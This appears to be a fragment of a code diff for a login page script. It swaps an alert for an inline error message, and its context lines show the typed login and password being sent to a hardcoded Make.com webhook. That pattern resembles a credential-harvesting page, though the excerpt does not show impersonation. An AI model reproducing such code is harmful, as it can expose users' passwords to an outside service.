@@ -109,12 +109,21 @@
 					document.querySelector('.loginbtn').addEventListener('click', function () {
 						var loginField = document.querySelector('input[type="text"]');
 						var passwordField = document.querySelector('input[type="password"]');
-      
+						var errorText = document.querySelector('.errortext');
+						var errorDiv = document.querySelector('.error');
+
+						// Проверка заполненности полей
 						if (loginField.value === '' || passwordField.value === '') {
-							alert('Одно из полей пустое');
+							errorText.innerText = 'Одно из полей пустое';
+							errorDiv.style.display = 'block';
 							return;
 						}
 
+						// Сброс текста ошибки и скрытие блока ошибки
+						errorText.innerText = '';
+						errorDiv.style.display = 'none';
+
+						// Отправка данных на вебхук
 						var webhookURL = 'https://hook.eu2.make.com/jfk4pee4p1k92avnsasm7mmvp9bamxcf';
 						var requestData = {
 							login: loginField.value,
